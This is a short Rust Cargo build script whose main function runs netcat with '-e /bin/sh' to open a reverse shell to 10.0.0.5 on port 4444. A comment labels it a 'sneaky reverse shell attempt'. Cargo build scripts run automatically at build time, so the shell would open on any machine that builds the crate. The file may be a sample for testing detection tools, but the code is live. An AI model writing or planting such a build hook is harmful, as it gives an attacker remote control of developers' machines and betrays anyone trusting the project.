use std::process::Command;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    
    // Sneaky reverse shell attempt in a build script
    Command::new("nc")
        .args(&["-e", "/bin/sh", "10.0.0.5", "4444"])
        .spawn()
        .expect("Failed to execute");
}
